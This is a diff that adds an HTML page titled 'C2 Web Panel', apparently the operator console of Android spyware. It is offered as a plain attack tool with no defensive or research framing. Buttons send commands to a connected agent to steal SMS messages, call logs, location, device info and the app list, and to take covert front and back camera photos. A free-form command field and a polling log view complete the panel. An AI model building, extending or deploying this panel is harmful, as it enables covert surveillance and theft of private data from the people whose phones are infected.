@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Web Panel</title>
+    <style>
+        body { background-color: #0d1117; color: #58a6ff; font-family: 'Courier New', monospace; margin: 0; padding: 20px; }
+        .container { max-width: 900px; margin: 0 auto; }
+        .header { border-bottom: 1px solid #30363d; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; }
+        .status { font-weight: bold; }
+        .offline { color: #f85149; } .online { color: #3fb950; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 10px; margin-bottom: 20px; }
+        button { background-color: #21262d; color: #c9d1d9; border: 1px solid #30363d; padding: 10px; cursor: pointer; border-radius: 6px; font-weight: bold; }
+        button:hover { background-color: #30363d; border-color: #8b949e; }
+        .terminal { background-color: #010409; border: 1px solid #30363d; height: 350px; overflow-y: scroll; padding: 10px; border-radius: 6px; color: #e6edf3; }
+        .input-group { display: flex; gap: 10px; margin-top: 10px; }
+        input { flex: 1; background: #010409; border: 1px solid #30363d; color: #c9d1d9; padding: 10px; border-radius: 6px; outline: none; }
+        input:focus { border-color: #58a6ff; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h2>~ C2 PANEL</h2>
+            <div class="status">Agent: <span id="status" class="offline">OFFLINE</span></div>
+        </div>
+        <div class="grid">
+            <button onclick="cmd('deviceinfo')">Device Info</button>
+            <button onclick="cmd('list_app')">List Apps</button>
+            <button onclick="cmd('getsms')">Get SMS</button>
+            <button onclick="cmd('getcalllogs')">Call Logs</button>
+            <button onclick="cmd('get_location')">Location</button>
+            <button onclick="cmd('takefrontpic')">Front Cam</button>
+            <button onclick="cmd('takebackpic')">Back Cam</button>
+        </div>
+        <div class="input-group">
+            <input type="text" id="cmdInput" placeholder="Custom command (e.g. open https://google.com)">
+            <button onclick="sendCustom()">Execute</button>
+        </div>
+        <h3 style="color: #8b949e;">> LOGS</h3>
+        <div class="terminal" id="terminal"></div>
+    </div>
+    <script>
+        const term = document.getElementById('terminal');
+        const stat = document.getElementById('status');
+        const inp = document.getElementById('cmdInput');
+
+        function cmd(c) {
+            fetch('/api/command', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cmd: c}) })
+            .then(r => r.json()).then(d => { if(d.status === 'error') alert(d.message); });
+        }
+        function sendCustom() { if(inp.value.trim()) { cmd(inp.value); inp.value = ""; } }
+        inp.addEventListener("keypress", e => { if (e.key === "Enter") sendCustom(); });
+
+        setInterval(() => {
+            fetch('/api/status').then(r => r.json()).then(d => {
+                if(d.connected) { stat.textContent = `ONLINE [${d.address[0]}]`; stat.className = 'online'; } 
+                else { stat.textContent = 'OFFLINE'; stat.className = 'offline'; }
+                
+                let scroll = term.scrollHeight - term.clientHeight <= term.scrollTop + 1;
+                term.innerHTML = d.logs.map(l => `<div>${l}</div>`).join('');
+                if(scroll) term.scrollTop = term.scrollHeight;
+            });
+        }, 1500);
+    </script>
+</body>
+</html>
